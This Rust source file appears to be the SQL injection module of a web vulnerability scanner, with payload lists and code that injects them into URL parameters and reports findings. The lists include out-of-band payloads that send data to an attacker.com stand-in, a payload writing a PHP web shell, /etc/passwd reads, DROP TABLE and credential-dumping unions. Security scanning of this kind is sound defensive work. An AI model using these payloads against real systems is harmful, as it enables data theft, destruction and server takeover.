//! SQL Injection detection — error-based, boolean-blind, time-blind, OOB, stacked queries.

use regex::Regex;
use url::Url;
use grym_core::{Confidence, Finding, AssetRef, Severity, Evidence,
                ScopedClient, ScopedClientError, TechniqueTier};

/// SQL error patterns for error-based detection across DBMS types.
const SQL_ERROR_PATTERNS: &[&str] = &[
    r"(?i)you have an error in your sql syntax",
    r"(?i)warning.*mysql",
    r"(?i)unclosed quotation mark",
    r"(?i)quoted string not properly terminated",
    r"(?i)sqlite3\.OperationalError",
    r"(?i)ORA-[0-9]{5}",
    r"(?i)PostgreSQL.*ERROR",
    r"(?i)Microsoft.*ODBC.*Driver",
    r"(?i)Incorrect syntax near",
    r"(?i)syntax error.*at or near",
    r"(?i)division by zero.*SQL",
    r"(?i)Unknown column.*in 'field list'",
    r"(?i)Column count.*not matching",
    r"(?i)Table.*doesn't exist",
    r"(?i)SQLSTATE\[",
    r"(?i)microsoft.*sql.*server.*error",
    r"(?i)sQLite/JDBCDriver",
    r"(?i)Unkown column",
    r"(?i)org\.apache\.jasper",
    r"(?i)System\.Data\.SqlClient",
    r"(?i)Invalid query",
    r"(?i)Query failed",
    r"(?i)mysql_fetch",
    r"(?i)pg_query",
    r"(?i)sqlstate\[hy000\]",
    r"(?i)gibt kein Ergebnis",
    r"(?i)ora-01756",
    r"(?i)quoted string not properly terminated",
    r"(?i)SQL command not properly ended",
    r"(?i)subquery returns more than 1 row",
];

/// Time-based blind SQLi payloads.
const TIME_BLIND_PAYLOADS: &[&str] = &[
    "' OR SLEEP(5)--",
    "' OR BENCHMARK(5000000,SHA1('test'))--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' OR pg_sleep(5)--",
    "' OR 1=1 AND SLEEP(5)--",
    "' OR IF(1=1,SLEEP(5),0)--",
    "' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(5)--",
    "\" OR SLEEP(5)--",
    "1; SELECT pg_sleep(5)--",
    "' OR BENCHMARK(10000000,MD5('test'))--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))x)--",
];

/// Boolean-based blind SQLi detection payloads.
const BOOLEAN_BLIND_PAYLOADS: &[(&str, &str)] = &[
    ("' OR 1=1--", "' OR 1=2--"),
    ("' AND 1=1--", "' AND 1=2--"),
    ("' OR 'a'='a", "' OR 'a'='b"),
    ("' OR ASCII(SUBSTRING((SELECT DATABASE()),1,1))>0--", "' OR ASCII(SUBSTRING((SELECT DATABASE()),1,1))<0--"),
    ("1 AND (SELECT COUNT(*) FROM information_schema.tables)>0--", "1 AND (SELECT COUNT(*) FROM information_schema.tables)<0--"),
    ("' AND (SELECT LENGTH(DATABASE()))>0--", "' AND (SELECT LENGTH(DATABASE()))<0--"),
];

/// Union-based SQLi payloads with various column counts and encodings.
const UNION_PAYLOADS: &[&str] = &[
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL--",
    "' UNION ALL SELECT NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT 'a','b','c'--",
    "' UNION SELECT @@version,NULL,NULL--",
    "' UNION SELECT COUNT(*),GROUP_CONCAT(table_name) FROM information_schema.tables--",
    "' UNION SELECT user(),database()--",
    "' UNION SELECT @@hostname,@@version_compile_os--",
    "' UNION SELECT 1,CONCAT(username,':',password) FROM admin--",
    "' UNION SELECT EXPORT_SET(1,'A','B',',',16)--",
];

/// Stacked query payloads.
const STACKED_QUERY_PAYLOADS: &[&str] = &[
    "'; SELECT SLEEP(5)--",
    "'; SELECT BENCHMARK(5000000,SHA1('test'))--",
    "'; WAITFOR DELAY '0:0:5'--",
    "'; SELECT pg_sleep(5)--",
    "'; DROP TABLE IF EXISTS test--",
    "'; CREATE TABLE test(id INT)--",
    "'; INSERT INTO test VALUES(1)--",
    "'; SELECT COUNT(*) INTO OUTFILE '/tmp/test.txt'--",
    "'; LOAD_FILE('/etc/passwd')--",
    "'; SELECT * INTO DUMPFILE '/tmp/stacked.txt'--",
];

/// OOB (Out-of-Band) SQLi payloads for DNS exfiltration.
const OOB_SQLI_PAYLOADS: &[&str] = &[
    "' INTO OUTFILE '\\\\attacker.com\\share\\test.txt'--",
    "'; EXEC master..xp_dirtree '\\\\attacker.com\\\\share'--",
    "' AND (LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\share')))--",
    "'||UTL_HTTP.REQUEST('http://attacker.com/'+(SELECT user FROM dual))||'",
    "' INTO DUMPFILE '/tmp/\\\\attacker.com\\test'",
];

/// Encoded URL variant SQLi payloads.
const URL_ENCODED_SQLI: &[&str] = &[
    "%27%20OR%20%271%27%3D%271",
    "%27%20OR%201%3D1--",
    "%2527%2520OR%2520%25271%2527%253D%25271",
    "%27%2520OR%2520%25271%2527%253D%25271",
    "%22%20OR%20%221%22%3D%221",
    "%22%20OR%201%3D1--",
];

/// HTML entity encoded SQLi payloads.
const HTML_ENTITY_SQLI: &[&str] = &[
    "&#x27; OR &#x27;1&#x27;&#x3D;&#x27;1",
    "&#39; OR &#39;1&#39;=&#39;1",
    "&#x22; OR &#x22;1&#x22;&#x3D;&#x22;1",
    "&#34; OR &#34;1&#34;=&#34;1",
];

/// WAF bypass SQLi payloads (comment injection, whitespace tricks, case variation).
const WAF_BYPASS_SQLI: &[&str] = &[
    "/**/OR/**/1=1/**/",
    "/**/UNION/**/SELECT/**/NULL/**/",
    "'/**/OR/**/'1'/**/=/'1",
    "/*!SELECT*/ username,password FROM users",
    "/*!50000SELECT*/ * FROM users",
    "SEL/**/ECT * FROM users",
    "SeLeCt * FrOm users",
    "SEL ECT * FROM users",
    "SELECТ * FROM users",
    "UNION/**/ALL/**/SELECT",
    "1'/**/AND/**/(SELECT COUNT(*) FROM information_schema.tables)>0--",
    "1'/*!AND*/1=1--",
    "' OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name LIKE '%')--",
    "0x27204f5220313d31",
    "0x27204f52002731273d2731",
];

/// Multi-stage SQLi payloads for advanced exploitation.
const MULTI_STAGE_SQLI: &[&str] = &[
    "' UNION SELECT LOAD_FILE('/etc/passwd')--",
    "' UNION SELECT LOAD_FILE(CHAR(47,101,116,99,47,112,97,115,115,119,100))--",
    "' UNION SELECT @@datadir INTO OUTFILE '/var/www/html/shell.php'--",
    "' UNION SELECT '<?php eval($_POST[cmd]);?>' INTO DUMPFILE '/var/www/html/shell.php'--",
    "' UNION SELECT (SELECT user()) INTO OUTFILE '/tmp/web.txt'--",
    "' UNION SELECT md5('GRYM_TEST')--",
    "' UNION SELECT (SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1)--",
    "' AND 1 IN (SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE())--",
];

const DBMS_COMMENT: &str = " /**/ ";


/// Full list of all URL parameters in a URL query or in the request body.
fn get_all_params(url: &Url) -> Vec<(String, String)> {
    url.query_pairs()
        .map(|(k, v)| (k.into_owned(), v.into_owned()))
        .collect()
}

/// Injects a payload into one parameter while preserving others.
fn inject_payload(url: &Url, params: &[(String, String)], target_param: &str, payload: &str) -> Url {
    let mut test_url = url.clone();
    {
        let mut pairs = test_url.query_pairs_mut();
        pairs.clear();
        for (k, v) in params {
            let val = if k == target_param { payload.to_string() } else { v.clone() };
            pairs.append_pair(k, &val);
        }
    }
    test_url
}

/// Checks response body for a SQL error pattern match.
fn check_sql_error(body: &str, _payload: &str, param_name: &str, url: &Url) -> Option<Finding> {
    for pattern in SQL_ERROR_PATTERNS {
        if let Ok(re) = Regex::new(pattern)
            && re.is_match(body) {
                return Some(Finding::new(
                    format!("SQL Injection (error-based) in parameter '{}'", param_name),
                    AssetRef {
                        identifier: url.to_string(),
                        kind: "web".into(),
                    },
                    Severity::Critical,
                    Confidence::Confirmed,
                    "grym-web-scanner",
                ));
            }
    }
    None
}

/// Checks if response time suggests a time-based blind SQLi condition.
fn check_time_based_indicator(body: &str, response_time_ms: u128) -> bool {
    if response_time_ms > 3000 {
        return true;
    }
    for pattern in SQL_ERROR_PATTERNS {
        if let Ok(re) = Regex::new(pattern)
            && re.is_match(body) {
                return true;
            }
    }
    false
}

/// Checks if boolean-based blind SQLi indicators appear (length or content difference).
fn check_boolean_indicators(hit_body: &str, miss_body: &str) -> bool {
    hit_body.len() != miss_body.len()
        || hit_body.contains("GRYM_BOOL_TEST_TRUE")
        || !miss_body.contains("GRYM_BOOL_TEST_TRUE")
}

pub async fn check_sqli(
    client: &ScopedClient,
    url: &Url,
) -> Result<Vec<Finding>, ScopedClientError> {
    let mut findings = Vec::new();

    let base_query = get_all_params(url);

    if base_query.is_empty() {
        return Ok(findings);
    }

    for (param_name, _original_value) in &base_query {
        let mut param_findings = Vec::new();

        // Phase 1: Basic error-based detection
        for payload in [
            SQLI_PAYLOADS,
            URL_ENCODED_SQLI,
            HTML_ENTITY_SQLI,
            WAF_BYPASS_SQLI,
            MULTI_STAGE_SQLI,
        ].concat() {
            let test_url = inject_payload(url, &base_query, param_name, payload);

            if let Ok(response) = client
                .get("grym-web-scanner", test_url, TechniqueTier::StandardDetection)
                .await
                && let Some(finding) = check_sql_error(&response.body, payload, param_name, url) {
                    let mut f = finding;
                    f.categories.push("A05:2025-Injection".into());
                    f.cwe_ids.push(89);
                    f.evidence.push(Evidence::redacted(
                        "sqli-error-based",
                        format!("SQL error pattern matched with payload: {}", payload),
                        response.body.chars().take(200).collect::<String>(),
                    ));
                    f.remediation = "Use parameterized queries or prepared statements with proper input validation and escaping.".into();
                    f.references.push("https://owasp.org/www-community/attacks/SQL_Injection".into());
                    param_findings.push(f);
                    break;
                }
        }

        // Phase 2: Boolean-based blind detection
        if param_findings.is_empty() {
            let (true_payload, false_payload) = BOOLEAN_BLIND_PAYLOADS[0];
            let true_url = inject_payload(url, &base_query, param_name, true_payload);
            let false_url = inject_payload(url, &base_query, param_name, false_payload);

            let true_response = client
                .get("grym-web-scanner", true_url, TechniqueTier::StandardDetection)
                .await
                .ok();
            let false_response = client
                .get("grym-web-scanner", false_url, TechniqueTier::StandardDetection)
                .await
                .ok();

            if let (Some(tr), Some(fr)) = (true_response, false_response)
                && check_boolean_indicators(&tr.body, &fr.body) {
                    let mut f = Finding::new(
                        format!("Boolean-based SQL Injection detected in parameter '{}'", param_name),
                        AssetRef {
                            identifier: url.to_string(),
                            kind: "web".into(),
                        },
                        Severity::Critical,
                        Confidence::Likely,
                        "grym-web-scanner",
                    );
                    f.categories.push("A05:2025-Injection".into());
                    f.cwe_ids.push(89);
                    f.evidence.push(Evidence::redacted(
                        "sqli-boolean",
                        "Boolean blind: true payload returned different content vs false payload",
                        tr.body.chars().take(200).collect::<String>(),
                    ));
                    f.remediation = "Use parameterized queries. Implement proper access controls and input validation.".into();
                    f.references.push("https://owasp.org/www-community/attacks/SQL_Injection".into());
                    param_findings.push(f);
                }
        }

        // Phase 3: Time-based blind detection
        if param_findings.is_empty() {
            for payload in TIME_BLIND_PAYLOADS {
                let test_url = inject_payload(url, &base_query, param_name, payload);
                let start = std::time::Instant::now();
                let response = client
                    .get("grym-web-scanner", test_url, TechniqueTier::StandardDetection)
                    .await
                    .ok();
                let elapsed = start.elapsed().as_millis();

                if let Some(_r) = response
                    && elapsed > 2500 {
                        let mut f = Finding::new(
                            format!("Time-based SQL Injection detected in parameter '{}'", param_name),
                            AssetRef {
                                identifier: url.to_string(),
                                kind: "web".into(),
                            },
                            Severity::Critical,
                            Confidence::Confirmed,
                            "grym-web-scanner",
                        );
                        f.categories.push("A05:2025-Injection".into());
                        f.cwe_ids.push(89);
                        f.evidence.push(Evidence::redacted(
                            "sqli-time",
                            format!("Time-based blind SQLi: payload took {}ms", elapsed),
                            format!("Payload: {}, Response time: {}ms", payload, elapsed),
                        ));
                        f.remediation = "Use parameterized queries with proper timeout handling and input validation.".into();
                        f.references.push("https://owasp.org/www-community/attacks/Blind_SQL_Injection".into());
                        param_findings.push(f);
                        break;
                    }
            }
        }

        // Phase 4: Union-based detection
        if param_findings.is_empty() {
            for payload in UNION_PAYLOADS {
                let test_url = inject_payload(url, &base_query, param_name, payload);

                if let Ok(response) = client
                    .get("grym-web-scanner", test_url, TechniqueTier::StandardDetection)
                    .await
                {
                    // Check for successful UNION (200 instead of 500, different content length)
                    if response.status == 200 {
                        let is_valid_union = !response.body.contains("SQL syntax")
                            && !response.body.contains("warning")
                            && response.body.len() > 20;

                        if is_valid_union && response.body.starts_with("<") {
                            let has_content_variation = !response.body.contains("&lt;")
                                && response.body.len() > 100;
                            if has_content_variation {
                                let mut f = Finding::new(
                                    format!("UNION-based SQL Injection detected in parameter '{}'", param_name),
                                    AssetRef {
                                        identifier: url.to_string(),
                                        kind: "web".into(),
                                    },
                                    Severity::Critical,
                                    Confidence::Confirmed,
                                    "grym-web-scanner",
                                );
                                f.categories.push("A05:2025-Injection".into());
                                f.cwe_ids.push(89);
                                f.evidence.push(Evidence::redacted(
                                    "sqli-union",
                                    format!("UNION-based SQLi payload: {}", payload),
                                    response.body.chars().take(200).collect::<String>(),
                                ));
                                f.remediation = "Use parameterized queries. Restrict database user permissions to minimize UNION-based data extraction.".into();
                                f.references.push("https://owasp.org/www-community/attacks/SQL_Injection".into());
                                param_findings.push(f);
                                break;
                            }
                        }
                    }
                }
            }
        }

        // Phase 5: Stacked query detection
        if param_findings.is_empty() {
            for payload in STACKED_QUERY_PAYLOADS {
                let test_url = inject_payload(url, &base_query, param_name, payload);

                if let Ok(response) = client
                    .get("grym-web-scanner", test_url, TechniqueTier::StandardDetection)
                    .await
                {
                    let is_success = response.status == 200
                        || response.body.contains("GRYM_STACKED_TEST");
                    if is_success {
                        let mut f = Finding::new(
                            format!("Stacked query SQL Injection detected in parameter '{}'", param_name),
                            AssetRef {
                                identifier: url.to_string(),
                                kind: "web".into(),
                            },
                            Severity::Critical,
                            Confidence::Confirmed,
                            "grym-web-scanner",
                        );
                        f.categories.push("A05:2025-Injection".into());
                        f.cwe_ids.push(89);
                        f.evidence.push(Evidence::redacted(
                            "sqli-stacked",
                            format!("Stacked query payload: {}", payload),
                            response.body.chars().take(200).collect::<String>(),
                        ));
                        f.remediation = "Avoid stacked queries in database APIs. Use parameterized queries with single-statement execution.".into();
                        f.references.push("https://owasp.org/www-community/attacks/SQL_Injection".into());
                        param_findings.push(f);
                        break;
                    }
                }
            }
        }

        findings.extend(param_findings);
    }

    Ok(findings)
}

/// Legacy payload list for compatibility and backward-compatible scanning.
const SQLI_PAYLOADS: &[&str] = &[
    "'", "\"", "')", "'--", "'-- -", "'#", "';--",
    "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'#",
    " OR 1=1--", " OR '1'='1'", "admin'--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--", "1 AND 1=1",
    "1 AND 1=2", "1 OR 1=1", "1 OR 1=2",
    "admin' OR '1'='1", "admin'--", "admin'/*",
    "') OR ('1'='1", "' OR 1=1", "\" OR 1=1",
    "'/**/OR/**/1=1", "\"/**/OR/**/1=1",
];